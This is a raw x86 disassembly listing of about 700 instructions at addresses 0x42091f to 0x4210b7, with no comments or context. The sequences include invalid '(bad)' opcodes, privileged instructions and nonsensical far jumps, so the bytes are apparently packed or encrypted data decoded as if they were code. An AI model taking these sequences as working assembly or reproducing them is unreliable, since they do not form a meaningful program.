  42091f:	outs   dx,DWORD PTR ds:[esi]
  420920:	aad    0xfc
  420922:	fmul   QWORD PTR [esi+0x15]
  420925:	inc    eax
  420926:	jmp    0x633e5620
  42092b:	nop
  42092c:	ffree  st(0)
  42092e:	adc    al,0xcc
  420930:	daa    
  420931:	dec    esi
  420932:	cmp    BYTE PTR [esi+edx*8],al
  420935:	gs test al,0xb6
  420938:	add    ecx,DWORD PTR ds:0xfcf25e5e
  42093e:	pop    esp
  42093f:	jmp    0x420943
  420941:	push   eax
  420942:	add    BYTE PTR [ebx+0x2475fb6d],al
  420948:	mov    eax,0x4495fc79
  42094d:	hlt    
  42094e:	inc    DWORD PTR [eax]
  420950:	add    BYTE PTR [eax],al
  420952:	add    BYTE PTR [eax],al
  420954:	and    DWORD PTR [edi-0x43f3bfef],ebx
  42095a:	mov    esp,0xc4820474
  42095f:	push   DWORD PTR ds:0xdcfffc81
  420965:	ins    BYTE PTR es:[edi],dx
  420966:	xchg   DWORD PTR [ebp-0x1c],esi
  420969:	fldcw  WORD PTR [edx]
  42096b:	mov    edx,DWORD PTR [edx]
  42096d:	cmp    edi,DWORD PTR [edi-0x8]
  420970:	fimul  WORD PTR [ebx+0xc]
  420973:	inc    DWORD PTR [edx]
  420975:	das    
  420976:	sti    
  420977:	jbe    0x4209ed
  420979:	ficom  WORD PTR [edx-0x7a39a54d]
  42097f:	inc    ebp
  420980:	mov    dl,bl
  420982:	jae    0xeb3380c
  420988:	jnp    0x4209d7
  42098a:	or     al,0xff
  42098c:	and    ah,BYTE PTR [edi]
  42098e:	in     al,0x81
  420990:	dec    edi
  420991:	(bad)  
  420994:	rol    esi,1
  420996:	xchg   DWORD PTR [esi+0x78],esi
  420999:	cmp    esi,ebx
  42099b:	jne    0x420967
  42099d:	mov    esi,0x1c4b0871
  4209a2:	call   0x8740a5bc
  4209a7:	inc    ebp
  4209a8:	cmp    BYTE PTR [edx-0x32880036],al
  4209ae:	jo     0x4209bd
  4209b0:	xlat   BYTE PTR ds:[ebx]
  4209b1:	mul    BYTE PTR [edx-0x77]
  4209b4:	fs add al,ch
  4209b7:	cmp    BYTE PTR [eax],al
  4209b9:	add    BYTE PTR [eax],al
  4209bb:	add    BYTE PTR [eax],al
  4209bd:	sbb    eax,esi
  4209bf:	sti    
  4209c0:	mov    ebx,esp
  4209c2:	mov    DWORD PTR [ecx-0x8],edi
  4209c5:	jne    0x42096d
  4209c7:	inc    eax
  4209c8:	jae    0x42094f
  4209ca:	lods   al,BYTE PTR ds:[esi]
  4209cb:	inc    ecx
  4209cc:	cld    
  4209cd:	test   al,0x34
  4209cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209d0:	xchg   BYTE PTR [edx+0x121e282d],bh
  4209d6:	mov    cl,0x40
  4209d8:	mov    BYTE PTR ds:0xdfbb6a9,al
  4209de:	div    BYTE PTR [ebp-0x3]
  4209e1:	cli    
  4209e2:	fdiv   DWORD PTR [esi+0x75edddf7]
  4209e8:	std    
  4209e9:	jmp    0x4b64:0x425d49a4
  4209f0:	shl    DWORD PTR [ecx+0x2b],0xd6
  4209f4:	push   esp
  4209f5:	(bad)  
  4209f6:	repz adc BYTE PTR [ebp+0x6a064572],dh
  4209fd:	je     0x420a7a
  4209ff:	inc    ecx
  420a00:	adc    ch,BYTE PTR [ecx+0x31]
  420a03:	sar    bh,0xff
  420a06:	sbb    eax,DWORD PTR [ebp-0x3a705503]
  420a0c:	xor    BYTE PTR [ebp+0x773c8589],dh
  420a12:	sub    BYTE PTR [edi+0x23ac3dbf],dl
  420a18:	repz imul bl
  420a1b:	pop    ds
  420a1c:	push   eax
  420a1d:	sub    bh,cl
  420a1f:	inc    eax
  420a20:	adc    al,BYTE PTR [eax]
  420a22:	add    BYTE PTR [eax],al
  420a24:	add    BYTE PTR [eax],al
  420a26:	ins    DWORD PTR es:[edi],dx
  420a27:	xor    eax,eax
  420a29:	(bad)  
  420a2a:	stc    
  420a2b:	push   0xffffffb7
  420a2d:	or     bl,bh
  420a2f:	sub    dl,dh
  420a31:	cld    
  420a32:	mov    BYTE PTR [edi],al
  420a34:	sbb    al,BYTE PTR [eax+0x75]
  420a37:	sahf   
  420a38:	inc    eax
  420a39:	jae    0x420aa7
  420a3b:	jo     0x420a54
  420a3d:	fsub   QWORD PTR [eax-0x15]
  420a40:	add    edx,DWORD PTR [esi-0x12]
  420a43:	add    DWORD PTR [edi-0xae598be],ebx
  420a49:	ret    
  420a4a:	xor    dl,al
  420a4c:	xchg   ebp,eax
  420a4d:	sbb    BYTE PTR [ecx-0xbfbd8f0],al
  420a53:	inc    edi
  420a54:	test   edx,esp
  420a56:	in     eax,dx
  420a57:	aas    
  420a58:	sbb    al,0x47
  420a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a5b:	xchg   DWORD PTR [edx],eax
  420a5d:	call   0x13bc8d60
  420a62:	jbe    0x420a66
  420a64:	out    0xd9,eax
  420a66:	mov    eax,ds:0x87281b8d
  420a6b:	ret    0xf6e6
  420a6e:	loopne 0x420a9c
  420a70:	ret    
  420a71:	mov    WORD PTR [edi-0x4e],fs
  420a74:	(bad)  
  420a75:	js     0x420acd
  420a77:	cmp    DWORD PTR ds:0x61dc4842,edi
  420a7d:	enter  0x8d5a,0x62
  420a81:	mov    BYTE PTR [edx+0x39],bl
  420a84:	and    eax,0x93457d42
  420a89:	or     eax,DWORD PTR [eax]
  420a8b:	add    BYTE PTR [eax],al
  420a8d:	add    BYTE PTR [eax],al
  420a8f:	cld    
  420a90:	(bad)  
  420a91:	xchg   edx,eax
  420a92:	mov    WORD PTR [edi],?
  420a94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a95:	add    DWORD PTR [esi],eax
  420a97:	cli    
  420a98:	(bad)  
  420a99:	xchg   edx,eax
  420a9a:	fst    DWORD PTR [edx]
  420a9c:	add    ah,bl
  420a9e:	add    esi,DWORD PTR [ebp-0x79]
  420aa1:	arpl   WORD PTR [edi-0x2c12c773],sp
  420aa7:	xor    bh,BYTE PTR [ecx]
  420aa9:	sti    
  420aaa:	jg     0x420b13
  420aac:	ret    0x8ae6
  420aaf:	mov    bh,0xaa
  420ab1:	imul   edi,DWORD PTR [ebx+ebp*2],0xb2da32bc
  420ab8:	test   DWORD PTR [ebx-0x58],ebp
  420abb:	pop    ebp
  420abc:	cmp    BYTE PTR [ebp-0x51ae2c],bh
  420ac2:	inc    esp
  420ac3:	mov    ah,0x14
  420ac5:	sbb    al,0xd7
  420ac7:	cmp    BYTE PTR ss:[ecx],bh
  420aca:	sub    al,0x9
  420acc:	mov    ch,0x3a
  420ace:	sahf   
  420acf:	cmp    ch,BYTE PTR [eax-0x51ed378]
  420ad5:	add    BYTE PTR ds:0xfbfc36b4,0x8c
  420adc:	mov    al,BYTE PTR [edx-0x3]
  420adf:	sub    al,0xce
  420ae1:	xchg   BYTE PTR [ebp+eax*8+0x36],ch
  420ae5:	cld    
  420ae6:	outs   dx,BYTE PTR ds:[esi]
  420ae7:	pop    ds
  420ae8:	lea    eax,[edx-0x3c94a33]
  420aee:	mov    ecx,0xcd823ecc
  420af3:	add    BYTE PTR [eax],al
  420af5:	add    BYTE PTR [eax],al
  420af7:	add    BYTE PTR ds:0x76ebfc36,dh
  420afd:	add    al,BYTE PTR [eax]
  420aff:	jo     0x420afb
  420b01:	lahf   
  420b02:	cld    
  420b03:	ds xor al,0x36
  420b06:	aam    0x6a
  420b08:	mov    DWORD PTR [eax],edi
  420b0a:	or     eax,0xfc37055c
  420b0f:	es aam 0xd5
  420b12:	and    BYTE PTR [ebp*8+0x76edc140],0xd3
  420b1a:	mov    ch,bh
  420b1c:	imul   DWORD PTR [ebx]
  420b1e:	or     ebp,eax
  420b20:	jbe    0x420b24
  420b22:	push   ecx
  420b23:	jb     0x420ad7
  420b25:	call   DWORD PTR [ebp+0x62]
  420b28:	inc    ecx
  420b29:	mov    al,BYTE PTR [edx-0x23]
  420b2c:	repz (bad) 
  420b30:	aas    
  420b31:	div    DWORD PTR [eax+0x60]
  420b34:	cli    
  420b35:	jbe    0x420baa
  420b37:	icebp  
  420b38:	popa   
  420b39:	push   ecx
  420b3a:	mov    eax,0x279c1
  420b3f:	add    BYTE PTR [ebx],bl
  420b41:	out    dx,al
  420b42:	xchg   DWORD PTR [ebp+0x44],ebx
  420b45:	ins    BYTE PTR es:[edi],dx
  420b46:	into   
  420b47:	call   0x89420eab
  420b4c:	cdq    
  420b4d:	test   BYTE PTR [ebp+0x651055],0x53
  420b54:	mov    eax,ds:0x3fef480
  420b59:	ret    0x894c
  420b5c:	add    BYTE PTR [eax],al
  420b5e:	add    BYTE PTR [eax],al
  420b60:	add    cl,al
  420b62:	out    dx,eax
  420b63:	cli    
  420b64:	push   ebx
  420b66:	jmp    0xf681:0xc292b190
  420b6d:	or     BYTE PTR [eax],dl
  420b6f:	xchg   esi,eax
  420b71:	int    0xe2
  420b73:	dec    BYTE PTR [edi-0x6d]
  420b76:	jo     0x420b84
  420b78:	lea    ebx,[ecx-0x9]
  420b7b:	cli    
  420b7c:	inc    DWORD PTR [ebx+0x53]
  420b7f:	in     al,0x7b
  420b81:	std    
  420b82:	sar    bl,0x33
  420b85:	mov    WORD PTR [esi],?
  420b87:	inc    ecx
  420b88:	or     al,0x61
  420b8a:	dec    eax
  420b8b:	hlt    
  420b8c:	sbb    ebx,DWORD PTR [esi+ebx*1+0x2b650bd]
  420b93:	push   0x0
  420b95:	inc    ecx
  420b96:	xor    al,0xfe
  420b99:	xchg   ebx,eax
  420b9a:	ret    0x6a4c
  420b9d:	pushf  
  420b9e:	rcl    DWORD PTR [ecx],0xe4
  420ba1:	test   eax,0x4c84fc42
  420ba6:	jo     0x420bb8
  420ba8:	push   0xfffc29e0
  420bad:	or     DWORD PTR [esp+edx*1],0x16
  420bb1:	int3   
  420bb2:	add    bh,BYTE PTR [edi-0x38]
  420bb5:	xchg   ebx,eax
  420bb6:	push   edi
  420bb7:	push   edi
  420bb8:	leave  
  420bb9:	push   ds
  420bba:	adc    eax,DWORD PTR [eax]
  420bbc:	xor    DWORD PTR [ebp+0x53],0x3c
  420bc0:	jae    0x420c29
  420bc2:	sbb    DWORD PTR [esi],esi
  420bc4:	cld    
  420bc5:	add    BYTE PTR [eax],al
  420bc7:	add    BYTE PTR [eax],al
  420bc9:	add    BYTE PTR [ecx+0x49828eb8],ah
  420bcf:	jbe    0x420c0d
  420bd1:	cld    
  420bd2:	pop    ebp
  420bd3:	das    
  420bd4:	cmp    al,0xfc
  420bd6:	inc    edx
  420bd7:	mov    al,ds:0xe56d7243
  420bdc:	cmp    ch,0x74
  420bdf:	sbb    DWORD PTR [eax+ebp*8],ebp
  420be2:	inc    ebx
  420be3:	mov    eax,ds:0x700eb107
  420be8:	(bad)  
  420be9:	mov    BYTE PTR [ecx],cl
  420beb:	jge    0x420ba3
  420bed:	or     eax,DWORD PTR [esi+0x6b]
  420bf0:	test   eax,0x8370bff
  420bf5:	inc    eax
  420bf6:	or     eax,0xfafc3d42
  420bfb:	test   al,0x3b
  420bfd:	cld    
  420bfe:	imul   ebp,DWORD PTR [edi],0x7a794a8f
  420c04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c05:	push   DWORD PTR [edx]
  420c07:	fadd   st(6),st
  420c09:	or     esi,ebp
  420c0b:	sub    eax,DWORD PTR [eax]
  420c0d:	add    dl,dl
  420c0f:	dec    esi
  420c10:	in     al,dx
  420c11:	adc    eax,0xc1df2b35
  420c16:	ins    DWORD PTR es:[edi],dx
  420c17:	sub    eax,DWORD PTR [ecx+0x1097bafd]
  420c1d:	push   0x77
  420c1f:	ins    DWORD PTR es:[edi],dx
  420c20:	cmp    eax,0xc036b912
  420c25:	dec    DWORD PTR [eax+0x4]
  420c28:	pop    ss
  420c29:	sbb    BYTE PTR [ebx+0xc1006b],al
  420c2f:	add    BYTE PTR [eax],al
  420c31:	add    BYTE PTR [eax],al
  420c33:	sub    ah,0x5
  420c36:	push   ebp
  420c37:	pop    ds
  420c38:	pop    edx
  420c39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c3a:	add    DWORD PTR ds:0x630c1724,esp
  420c40:	add    ah,BYTE PTR [edi]
  420c42:	add    al,0xfc
  420c44:	cmp    DWORD PTR [ecx+0x3e],ebp
  420c47:	imul   ebp,DWORD PTR [esi-0x63dd0cf3],0x574fd69
  420c51:	pop    esp
  420c52:	inc    ebx
  420c53:	mov    edx,0xf537c681
  420c58:	inc    ecx
  420c59:	rcl    bl,cl
  420c5b:	test   al,0xcd
  420c5d:	lods   eax,DWORD PTR ds:[esi]
  420c5e:	sbb    BYTE PTR [ebp+0xc],ch
  420c61:	daa    
  420c62:	add    al,0xf6
  420c64:	inc    ecx
  420c65:	adc    cl,BYTE PTR [edx]
  420c67:	shl    BYTE PTR ds:0xc28b1bfb,0xe6
  420c6e:	sub    BYTE PTR [ecx],0x35
  420c71:	jno    0x420cb9
  420c73:	mov    cl,0x41
  420c75:	adc    ecx,DWORD PTR [ebx-0xce32ee2]
  420c7b:	sbb    eax,0xfa83fed1
  420c80:	xor    al,0xe6
  420c82:	test   eax,0x4d0d174
  420c87:	pop    ebp
  420c88:	add    ah,bh
  420c8a:	add    esi,DWORD PTR ds:0xd80bd335
  420c90:	push   cs
  420c91:	mov    bh,0x11
  420c93:	xor    eax,0x337202
  420c98:	add    BYTE PTR [eax],al
  420c9a:	add    BYTE PTR [eax],al
  420c9c:	cmc    
  420c9d:	xor    esi,DWORD PTR ds:0x8bfb88b7
  420ca3:	cmovno ebx,DWORD PTR [ecx]
  420ca6:	loopne 0x420c88
  420ca8:	sub    BYTE PTR [esi-0x41002d0c],0xf6
  420caf:	shl    DWORD PTR [ecx+0x273ef6ae],cl
  420cb5:	push   es
  420cb6:	popf   
  420cb7:	ds scas al,BYTE PTR es:[di]
  420cba:	fadd   st,st(3)
  420cbc:	mov    bh,BYTE PTR [ebp-0x1]
  420cbf:	sub    dl,cl
  420cc1:	add    dh,BYTE PTR [ecx+0x1235a0e8]
  420cc7:	cmc    
  420cc8:	test   edx,eax
  420cca:	jmp    FWORD PTR [eax-0x54]
  420ccd:	xor    al,0x70
  420ccf:	loope  0x420c72
  420cd1:	mov    al,0x7
  420cd3:	ror    DWORD PTR [eax],0x39
  420cd6:	(bad)  
  420cd7:	call   0x2302970c
  420cdc:	sub    al,BYTE PTR [edx+0xb]
  420cdf:	jmp    0x192d980f
  420ce4:	es iret 
  420ce6:	xor    BYTE PTR [esi-0x159630b8],ah
  420cec:	inc    ecx
  420ced:	stos   BYTE PTR es:[edi],al
  420cee:	inc    BYTE PTR [eax]
  420cf0:	jns    0x420cf4
  420cf2:	add    BYTE PTR [ecx+0x58],ch
  420cf5:	mov    al,0x7
  420cf7:	xchg   BYTE PTR [edx-0x4e],ch
  420cfa:	adc    DWORD PTR [ecx],ebp
  420cfc:	jno    0x420d79
  420cfe:	inc    ebp
  420cff:	loope  0x420d01
  420d01:	add    BYTE PTR [eax],al
  420d03:	add    BYTE PTR [eax],al
  420d05:	cmc    
  420d06:	sub    edi,esp
  420d08:	cmc    
  420d09:	(bad)  
  420d0a:	mov    BYTE PTR [edx+0x61],cl
  420d0d:	mov    bl,0xfc
  420d10:	hlt    
  420d11:	cs add eax,0x73fbe940
  420d17:	jae    0x420cca
  420d19:	fistp  QWORD PTR [eax-0x755a4305]
  420d1f:	inc    edx
  420d20:	inc    ecx
  420d21:	(bad)  
  420d22:	mov    ebp,0xb039f203
  420d27:	add    esp,DWORD PTR [eax-0x45]
  420d2a:	sub    dh,BYTE PTR [eax]
  420d2c:	xchg   ebx,eax
  420d2d:	jp     0x420cd9
  420d2f:	(bad)  
  420d30:	fdiv   DWORD PTR [esi+0x2]
  420d33:	push   eax
  420d34:	mov    esi,0xf87c1061
  420d39:	mov    dh,0x33
  420d3b:	xchg   DWORD PTR [eax],eax
  420d3d:	mov    ds:0xcc74c33a,al
  420d42:	dec    esi
  420d43:	mov    DWORD PTR [ebp-0x6c],ecx
  420d46:	push   eax
  420d47:	sti    
  420d48:	jbe    0x420cda
  420d4a:	dec    edi
  420d4b:	sti    
  420d4c:	jbe    0x420db2
  420d4e:	not    BYTE PTR [ecx]
  420d50:	jo     0x420dbf
  420d52:	aas    
  420d53:	cld    
  420d54:	test   BYTE PTR [ebx+ebp*2],cl
  420d57:	or     BYTE PTR [ebx+0x46370691],cl
  420d5d:	pusha  
  420d5e:	ins    BYTE PTR es:[edi],dx
  420d5f:	add    BYTE PTR [eax+0x6815ea5d],dh
  420d65:	dec    esp
  420d66:	jg     0x420d64
  420d68:	inc    DWORD PTR [eax]
  420d6a:	add    BYTE PTR [eax],al
  420d6c:	add    BYTE PTR [eax],al
  420d6e:	arpl   bp,si
  420d70:	xor    bh,bh
  420d72:	xor    DWORD PTR [ebx+0xd],esp
  420d75:	inc    eax
  420d76:	sbb    al,0xf6
  420d78:	jb     0x420d82
  420d7a:	or     ecx,DWORD PTR [esp+ecx*1]
  420d7d:	adc    ecx,DWORD PTR [esi+edi*8+0x31]
  420d81:	rcr    BYTE PTR [ebx-0x39],0xbe
  420d85:	add    al,0x1c
  420d87:	dec    ebp
  420d88:	xchg   eax,esi
  420d8a:	xchg   edi,eax
  420d8b:	std    
  420d8c:	add    al,0x0
  420d8f:	add    eax,0xff5c0068
  420d94:	jmp    FWORD PTR [ecx-0x24]
  420d97:	dec    esi
  420d98:	sti    
  420d99:	adc    eax,0x400fb8
  420d9e:	push   edi
  420d9f:	ins    DWORD PTR es:[edi],dx
  420da0:	add    al,0x85
  420da2:	xchg   edx,eax
  420da3:	imul   eax,DWORD PTR [ebx],0x56
  420da6:	mov    ecx,DWORD PTR [esp+ecx*1]
  420da9:	adc    ecx,DWORD PTR [edi+edi*8]
  420dac:	pop    ebp
  420dad:	ret    
  420dae:	loope  0x420d39
  420db0:	call   0x4519636
  420db5:	add    BYTE PTR [ecx+edx*2-0x618aa8ae],bl
  420dbc:	test   edi,ebp
  420dbe:	sahf   
  420dbf:	add    edi,DWORD PTR [edi+ecx*2]
  420dc2:	sbb    eax,0x75000133
  420dc7:	xor    al,0x12
  420dc9:	je     0x420e2f
  420dcb:	imul   eax,DWORD PTR [eax],0x12e3848
  420dd1:	add    BYTE PTR [eax],al
  420dd3:	add    BYTE PTR [eax],al
  420dd5:	add    BYTE PTR [eax],al
  420dd7:	jne    0x420da9
  420dd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dda:	xor    BYTE PTR [ebx+0x51],ah
  420ddd:	scas   al,BYTE PTR es:[edi]
  420dde:	pop    es
  420ddf:	dec    ebp
  420de0:	out    0xbb,al
  420de2:	call   FWORD PTR [edx-0x14]
  420de5:	stos   DWORD PTR es:[edi],eax
  420de6:	out    0xca,eax
  420de8:	fild   DWORD PTR [ebx]
  420dea:	push   0xffc3c43d
  420def:	call   FWORD PTR [edi]
  420df1:	add    eax,DWORD PTR [eax]
  420df3:	jne    0x420dc3
  420df5:	jbe    0x420dee
  420df7:	xor    BYTE PTR [ecx+0x38],ch
  420dfa:	out    0x68,eax
  420dfc:	pop    ebp
  420dfd:	cmp    esp,edi
  420dff:	neg    BYTE PTR [edi+0x13]
  420e02:	sbb    DWORD PTR ds:0xfe3caf81,0xf08ad360
  420e0c:	stos   DWORD PTR es:[edi],eax
  420e0d:	cmp    al,0xfc
  420e0f:	add    cl,BYTE PTR [ecx+edi*1]
  420e12:	jb     0x420e7d
  420e14:	sbb    ebx,0xffffffae
  420e17:	repz test al,0x7e
  420e1a:	mov    edi,0xffadfb61
  420e1f:	pop    edx
  420e20:	fwait
  420e21:	add    eax,DWORD PTR [eax]
  420e23:	jne    0x420e6a
  420e25:	add    ebp,DWORD PTR [edx+0x75]
  420e28:	push   ebp
  420e29:	add    ebp,DWORD PTR [eax+0x75]
  420e2c:	sbb    eax,DWORD PTR [eax]
  420e2e:	rol    dl,0x6e
  420e31:	add    al,0xfd
  420e33:	pusha  
  420e34:	imul   edx,DWORD PTR [edx],0x40
  420e37:	jne    0x420e3b
  420e39:	push   0x3c
  420e3b:	add    BYTE PTR [eax],al
  420e3d:	add    BYTE PTR [eax],al
  420e3f:	add    BYTE PTR [ecx+0x23c1f8b7],ch
  420e45:	xor    BYTE PTR [esi],bl
  420e47:	add    al,0x75
  420e49:	add    bl,BYTE PTR [ecx-0x5abdbb6f]
  420e4f:	fldcw  WORD PTR ds:0x750c283b
  420e55:	shl    ch,cl
  420e57:	adc    BYTE PTR [ecx+0x15],ch
  420e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e5b:	add    esp,DWORD PTR ds:0xc729d203
  420e61:	jge    0x420e2d
  420e63:	test   BYTE PTR [esi+0x12],cl
  420e66:	jmp    0x420e6b
  420e68:	jne    0x420e3f
  420e6a:	xor    al,0xd3
  420e6c:	inc    DWORD PTR [esi+0x31493eb6]
  420e72:	push   ss
  420e73:	lods   al,BYTE PTR ds:[esi]
  420e74:	dec    eax
  420e75:	add    ah,bh
  420e77:	add    edi,DWORD PTR [eax]
  420e79:	pop    ss
  420e7a:	xor    edx,DWORD PTR ds:0xf92f02b5
  420e80:	daa    
  420e81:	add    ah,bh
  420e83:	add    ebp,DWORD PTR [eax+0x1231d9d7]
  420e89:	imul   edx,DWORD PTR ds:0xed27504,0xe6c2812c
  420e93:	stos   DWORD PTR es:[edi],eax
  420e94:	push   ds
  420e95:	stos   BYTE PTR es:[edi],al
  420e96:	es add al,0xbc
  420e99:	add    eax,0x7f7503e8
  420e9e:	mov    ds:0x5d30ef3b,eax
  420ea3:	sub    eax,DWORD PTR [eax]
  420ea5:	add    BYTE PTR [eax],al
  420ea7:	add    BYTE PTR [eax],al
  420ea9:	cld    
  420eaa:	inc    edx
  420eab:	push   esp
  420eac:	cmp    dh,ch
  420eae:	inc    ebp
  420eaf:	fiadd  DWORD PTR [esi-0x1145cf36]
  420eb5:	std    
  420eb6:	dec    eax
  420eb7:	xchg   esi,eax
  420eb8:	mov    bh,dh
  420eba:	xor    edi,edi
  420ebc:	xor    DWORD PTR [edi+0x2e],edi
  420ebf:	dec    edi
  420ec0:	cs in  eax,0x8
  420ec3:	call   0xfc713524
  420ec8:	fs ss mov ch,0xc
  420ecc:	xor    DWORD PTR [esi+0x2f],0x72
  420ed0:	loope  0x420f21
  420ed2:	adc    al,0x68
  420ed4:	fdiv   DWORD PTR [esi-0x3ad67cd0]
  420eda:	std    
  420edb:	inc    ebp
  420edc:	push   0x3c
  420ede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420edf:	jno    0x420f1d
  420ee1:	push   0x48475c70
  420ee6:	dec    ecx
  420ee7:	shl    ebp,0x76
  420eea:	jb     0x420eea
  420eec:	ror    DWORD PTR [edx+0x6c55bf84],0xa8
  420ef3:	add    BYTE PTR [ecx],0x5f
  420ef6:	mov    ch,0x16
  420ef8:	out    dx,al
  420ef9:	(bad)
  420efc:	dec    edi
  420efd:	mov    edx,0xf9dd7348
  420f02:	cmp    BYTE PTR ds:0x80a8781c,ch
  420f08:	and    DWORD PTR [ebp+0x2],esi
  420f0b:	jae    0x420efa
  420f0d:	add    BYTE PTR [eax],al
  420f0f:	add    BYTE PTR [eax],al
  420f11:	add    BYTE PTR [ecx],ah
  420f13:	jo     0x420f54
  420f15:	stos   BYTE PTR es:[edi],al
  420f16:	or     BYTE PTR [eax-0x40],dh
  420f19:	sbb    bh,BYTE PTR [edx]
  420f1b:	jnp    0x420f88
  420f1d:	lds    edi,FWORD PTR [edx-0x28]
  420f20:	push   esp
  420f21:	sbb    al,0x3
  420f23:	dec    ebx
  420f24:	cld    
  420f25:	aam    0x6
  420f27:	adc    eax,DWORD PTR [eax-0x17]
  420f2a:	stc    
  420f2b:	pop    ds
  420f2c:	adc    BYTE PTR [edi+0x12],0x2
  420f30:	mov    DWORD PTR [esp+ebp*2+0x75],ebx
  420f34:	add    eax,0x73cb916a
  420f39:	add    dh,al
  420f3b:	xchg   ah,dh
  420f3d:	das    
  420f3e:	or     BYTE PTR [ecx],dh
  420f40:	bound  eax,QWORD PTR [ebp-0x74d7a074]
  420f46:	fs xor eax,0x7cfa55bc
  420f4c:	add    bh,bh
  420f4e:	test   eax,0x8c400ed7
  420f53:	xchg   ah,dh
  420f55:	(bad)  
  420f56:	jmp    0xe9427963
  420f5b:	jmp    0x84fc:0x439d6811
  420f62:	dec    esp
  420f63:	(bad)  
  420f65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f66:	dec    esp
  420f67:	pop    edi
  420f68:	or     esp,DWORD PTR [esi-0x27]
  420f6b:	jmp    0x833a:0x7bba0870
  420f72:	or     al,BYTE PTR ds:0xbde7
  420f78:	add    BYTE PTR [eax],al
  420f7a:	add    bh,ch
  420f7c:	add    ebx,DWORD PTR [ebx+0x5e]
  420f7f:	xchg   ecx,eax
  420f80:	cmp    BYTE PTR [edi-0x3d0f1a5],0x54
  420f87:	xlat   BYTE PTR ds:[ebx]
  420f88:	out    0x7f,eax
  420f8a:	in     al,0xe4
  420f8c:	sub    eax,0x58
  420f8f:	sbb    BYTE PTR [ebx],al
  420f91:	add    BYTE PTR [esi+0x6b],dl
  420f94:	pop    esi
  420f95:	call   0x87485c12
  420f9a:	stc    
  420f9b:	dec    ebx
  420f9c:	xchg   DWORD PTR [eax+0x24],eax
  420f9f:	sub    al,0x53
  420fa1:	in     al,0xe2
  420fa3:	mov    bl,0xe9
  420fa5:	sti    
  420fa6:	test   esp,ecx
  420fa8:	pop    esi
  420fa9:	jbe    0x420f38
  420fab:	pop    eax
  420fac:	dec    edi
  420fad:	or     al,0x2
  420faf:	fadd   QWORD PTR [edx]
  420fb1:	push   eax
  420fb2:	lea    ebx,[eax]
  420fb4:	dec    edi
  420fb5:	or     BYTE PTR [eax+0x75],dl
  420fb8:	fmul   DWORD PTR ds:0x596464
  420fbe:	mov    ebp,eax
  420fc0:	fwait
  420fc1:	ss cld 
  420fc3:	dec    ecx
  420fc4:	cmp    DWORD PTR [ebp+0x2359183],eax
  420fca:	add    BYTE PTR [ebp-0x3f],dh
  420fcd:	jmp    0x7d29bace
  420fd2:	mov    edi,0x83855728
  420fd7:	push   ecx
  420fd8:	push   ebp
  420fd9:	add    al,BYTE PTR [eax]
  420fdb:	jne    0x421046
  420fdd:	iret   
  420fde:	mov    al,BYTE PTR [eax]
  420fe0:	add    BYTE PTR [eax],al
  420fe2:	add    BYTE PTR [eax],al
  420fe4:	xor    DWORD PTR ds:0xb98d5010,edi
  420fea:	addr16 std 
  420fec:	jp     0x420f8b
  420fee:	inc    eax
  420fef:	jae    0x420f83
  420ff1:	xor    eax,0x1985237d
  420ff6:	add    BYTE PTR [eax],al
  420ff8:	test   edi,edx
  420ffa:	or     BYTE PTR [ebx-0x17f40057],cl
  421000:	std    
  421001:	cmp    al,0x34
  421003:	cld    
  421004:	pop    esi
  421005:	xor    al,BYTE PTR [edi-0x2fcc66bd]
  42100b:	out    0xd0,eax
  42100d:	jno    0x421012
  42100f:	add    BYTE PTR [eax],al
  421011:	test   al,0xdf
  421013:	emms   
  421015:	sbb    eax,DWORD PTR [eax]
  421017:	push   eax
  421018:	retf   
  421019:	mov    WORD PTR [esi],cs
  42101b:	mov    BYTE PTR [ebx+ebx*8+0x17358303],al
  421022:	pop    ebp
  421023:	push   ebp
  421024:	or     cl,BYTE PTR [edi-0x80]
  421027:	push   cs
  421028:	mov    ch,0x1b
  42102a:	test   al,0x7f
  42102c:	jne    0x421049
  42102e:	add    BYTE PTR [ebp-0xe],dl
  421031:	push   esi
  421032:	mov    WORD PTR [ecx],ss
  421034:	xor    eax,0xe1cee702
  421039:	pop    ss
  42103a:	arpl   WORD PTR ds:0x446c0235,dx
  421040:	xor    ebp,edi
  421042:	jae    0x421088
  421044:	sub    BYTE PTR [ecx+0x4b],bh
  421047:	fld    DWORD PTR [eax]
  421049:	add    BYTE PTR [eax],al
  42104b:	add    BYTE PTR [eax],al
  42104d:	mov    ch,0xd3
  42104f:	dec    esi
  421050:	xchg   ecx,eax
  421051:	push   cs
  421052:	sub    eax,0x1a434335
  421057:	jl     0x4210c1
  421059:	test   al,0x2d
  42105b:	sub    ecx,edx
  42105d:	in     eax,dx
  42105e:	push   ds
  42105f:	mov    bh,0xd2
  421061:	inc    eax
  421062:	xchg   DWORD PTR ds:0x31f154b1,edx
  421068:	repz cmp BYTE PTR [ecx-0x55],0xb
  42106d:	sub    edx,ecx
  42106f:	std    
  421070:	mov    al,0x6a
  421072:	sub    eax,0x965d077b
  421077:	pop    ds
  421078:	aaa    
  421079:	imul   edi,DWORD PTR [ecx-0x2a],0x15ab6880
  421080:	rcl    DWORD PTR [edx-0x7f],cl
  421083:	xor    BYTE PTR ds:0x8b131951,0xb7
  42108a:	cli    
  42108b:	push   eax
  42108c:	add    ch,dh
  42108e:	mov    dh,0xba
  421090:	ficom  DWORD PTR [edx-0x20]
  421093:	jge    0x421098
  421095:	jne    0x42101e
  421097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421098:	mov    al,0x57
  42109a:	jns    0x4210b7
  42109c:	cmp    BYTE PTR [eax-0x13fd6b67],bh
  4210a2:	inc    ebx
  4210a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210a4:	and    esi,DWORD PTR [edx+edx*8+0x7e]
  4210a8:	clc    
  4210a9:	fisubr WORD PTR [ebx]
  4210ab:	test   DWORD PTR [edx-0x4f5e78d6],ecx
  4210b1:	add    BYTE PTR [eax],al
  4210b3:	add    BYTE PTR [eax],al
  4210b5:	add    dl,al
  4210b7:	xchg   edi,eax
